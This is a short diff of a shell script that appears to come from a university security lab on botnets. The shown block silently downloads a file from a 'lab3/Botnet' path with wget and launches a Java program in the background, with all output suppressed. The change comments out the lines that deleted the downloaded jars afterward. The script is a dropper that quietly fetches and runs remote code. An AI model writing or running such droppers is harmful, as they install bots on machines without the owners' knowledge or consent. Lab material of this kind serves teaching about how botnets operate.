@@ -32,10 +32,13 @@ if [ -z "$DIR" ]; then
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$MAIL" &> /dev/null
     #javac $SRC                                                                                                          
 
+
     #rm $SRC
+    
     java -classpath "${PIRC}:${MAIL}:." $TARGET &> /dev/null &
-    rm $PIRC
-    rm $MAIL
+    
+    #rm $PIRC
+    #rm $MAIL
     cd $CURDIR
 fi
 ###########################################
